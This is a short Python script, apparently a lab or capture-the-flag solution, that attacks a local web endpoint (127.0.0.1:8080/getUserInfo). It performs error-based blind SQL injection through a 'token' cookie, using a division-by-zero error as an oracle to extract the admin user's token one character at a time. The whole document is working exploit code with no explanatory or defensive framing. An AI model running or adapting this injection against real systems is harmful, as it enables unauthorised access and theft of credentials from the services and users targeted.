import urllib.parse
import requests
import urllib

url = "http://127.0.0.1:8080/getUserInfo"
symbols = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def make_request():
    token = ""
    while 1:
        for sym in symbols:
            cookies = {"token": urllib.parse.quote(f"'||(select case when token like '{token+sym}%' then 1 else (select 1)/0 end from tokens where login='admin')--")}
            resp = requests.get(url="http://127.0.0.1:8080/getUserInfo", cookies=cookies)
            body = resp.json()
            if body["err"] != "ERROR: division by zero (SQLSTATE 22012)":
                token += sym
                print(token)
                break
        else:
            print(token)
            break


if __name__ == "__main__":
    make_request()
